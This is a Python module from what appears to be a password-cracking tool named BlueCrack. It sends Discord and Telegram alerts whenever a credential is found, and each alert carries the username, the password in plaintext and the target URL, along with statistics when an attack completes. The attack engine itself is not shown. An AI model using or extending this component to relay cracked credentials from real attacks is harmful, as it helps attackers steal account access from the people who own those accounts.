"""
BlueCrack Notifier
===================
Notification system supporting Discord webhooks and Telegram bots.
Sends non-blocking alerts when credentials are found.
"""

import json
import threading
from typing import Any, Dict, List

import requests


class NotificationBackend:
    """Base class for notification backends."""

    def send(self, title: str, message: str, color: int = 0x00FF00) -> bool:
        """Send a notification. Returns True on success."""
        raise NotImplementedError


class DiscordWebhook(NotificationBackend):
    """Send notifications via Discord webhook."""

    def __init__(self, webhook_url: str) -> None:
        self.webhook_url = webhook_url
        self.name = "discord"

    def send(self, title: str, message: str, color: int = 0x00FF00) -> bool:
        payload = {
            "embeds": [
                {
                    "title": title,
                    "description": message,
                    "color": color,
                    "footer": {"text": "BlueCrack Notification"},
                }
            ]
        }
        try:
            resp = requests.post(
                self.webhook_url,
                json=payload,
                timeout=10,
            )
            return 200 <= resp.status_code < 300
        except Exception:
            return False


class TelegramBot(NotificationBackend):
    """Send notifications via Telegram Bot API."""

    def __init__(self, bot_token: str, chat_id: str) -> None:
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.name = "telegram"

    def send(self, title: str, message: str, color: int = 0x00FF00) -> bool:
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": f"<b>{title}</b>\n\n{message}",
            "parse_mode": "HTML",
        }
        try:
            resp = requests.post(url, json=payload, timeout=10)
            return resp.status_code == 200
        except Exception:
            return False


class Notifier:
    """Manages notification backends and dispatches alerts."""

    def __init__(self) -> None:
        self._backends: List[NotificationBackend] = []
        self._enabled = True
        self._lock = threading.Lock()

    def add_discord(self, webhook_url: str) -> None:
        """Add a Discord webhook backend."""
        with self._lock:
            # Remove existing discord backends
            self._backends = [
                b for b in self._backends if not isinstance(b, DiscordWebhook)
            ]
            self._backends.append(DiscordWebhook(webhook_url))

    def add_telegram(self, bot_token: str, chat_id: str) -> None:
        """Add a Telegram bot backend."""
        with self._lock:
            # Remove existing telegram backends
            self._backends = [
                b for b in self._backends if not isinstance(b, TelegramBot)
            ]
            self._backends.append(TelegramBot(bot_token, chat_id))

    def notify(self, event: str, data: Dict[str, Any]) -> None:
        """Send notification to all backends (non-blocking).

        Args:
            event: Event type (e.g., "credential_found", "attack_complete")
            data: Event data dict.
        """
        if not self._enabled:
            return

        if event == "credential_found":
            title = "🔓 Credential Found!"
            message = (
                f"**Username:** `{data.get('username', '?')}`\n"
                f"**Password:** `{data.get('password', '?')}`\n"
                f"**Target:** {data.get('target_url', '?')}"
            )
            color = 0x00FF00
        elif event == "attack_complete":
            title = "✅ Attack Complete"
            message = (
                f"**Hits:** {data.get('successes', 0)}\n"
                f"**Attempted:** {data.get('attempted', 0)}\n"
                f"**Elapsed:** {data.get('elapsed', 0):.1f}s"
            )
            color = 0x3498DB
        elif event == "test":
            title = "🧪 Test Notification"
            message = "BlueCrack notifications are working!"
            color = 0xF39C12
        else:
            title = f"BlueCrack: {event}"
            message = json.dumps(data, indent=2)
            color = 0x9B59B6

        with self._lock:
            backends = list(self._backends)

        for backend in backends:
            threading.Thread(
                target=backend.send,
                args=(title, message, color),
                daemon=True,
            ).start()

    def test(self) -> Dict[str, bool]:
        """Send test notification to all backends and return results."""
        results: Dict[str, bool] = {}
        with self._lock:
            backends = list(self._backends)

        for backend in backends:
            name = getattr(backend, "name", type(backend).__name__)
            results[name] = backend.send(
                "🧪 Test Notification",
                "BlueCrack notifications are working!",
                0xF39C12,
            )
        return results

    def get_config(self) -> List[Dict[str, Any]]:
        """Return configured backend info (no secrets)."""
        with self._lock:
            result = []
            for b in self._backends:
                if isinstance(b, DiscordWebhook):
                    result.append({
                        "type": "discord",
                        "configured": True,
                        "url": b.webhook_url[:30] + "...",
                    })
                elif isinstance(b, TelegramBot):
                    result.append({
                        "type": "telegram",
                        "configured": True,
                        "chat_id": b.chat_id,
                    })
            return result

    @property
    def has_backends(self) -> bool:
        """Check if any notification backends are configured."""
        with self._lock:
            return len(self._backends) > 0
